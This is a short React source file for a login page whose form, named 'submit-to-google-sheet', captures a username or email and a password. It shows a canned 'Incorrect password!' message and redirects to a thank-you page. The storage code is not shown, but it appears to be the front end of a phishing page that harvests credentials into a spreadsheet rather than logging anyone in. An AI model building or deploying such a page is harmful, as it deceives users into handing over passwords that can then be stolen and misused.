import React from 'react'
import { useNavigate } from 'react-router-dom'
export default function Loginpage({ email, password, addInfo, btn, change, incorrect, icon, veiw, snLoad, submit}) {
    
  const navigate = useNavigate()
  const Load = (to, snLoad)=> {
    snLoad.current.style = 'display: flex;'
    setTimeout(()=>{navigate(to)}, 2000)
    setTimeout(() => {
      snLoad.current.style = 'display:  none;'
    }, 3000)
    
  }



  

    return (
        <>
        <form name="submit-to-google-sheet" onSubmit={()=>{submit()}}>

            <div className="heading">Log in</div>
            <div className="email-field">
                <div className="label email-label" ><label htmlFor="email">USERNAME OR EMAIL</label></div>
                <div className="username"><input type="text" id='email' className='input-fields' ref={email} onChange={change} name='Username' /></div>
            </div>
            <div className="pass-field">
                <div className="ab">
                    <div className="label pass-label"><label htmlFor="pass">PASSWORD</label></div>
                    <div className="password-box">
                        <div className="password"><input type="password" id='pass' className='input-fields' ref={password} onChange={change} name='Password' /></div>

                        {/* eye-sharp */}
                    </div>
                    <div className="icon"><ion-icon name='eye-off-sharp' id="eye-off" onClick={veiw} ref={icon}></ion-icon></div>
                </div>
            </div>

            <div className="incorrect" ref={incorrect}>Incorrect password! <br /> Make sure you have filled correct username and password!</div>
            <span><div className="sub-btn" onClick={() => { Load('/thank-you', snLoad); submit() }} ><button id='submit-btn' type='submit' ref={btn} onClick={addInfo} >Log in</button></div></span>
        </form>
        </>
    )
}


// Loginpage.defaultProps = {
//     icon : 'eye-off-sharp'
// }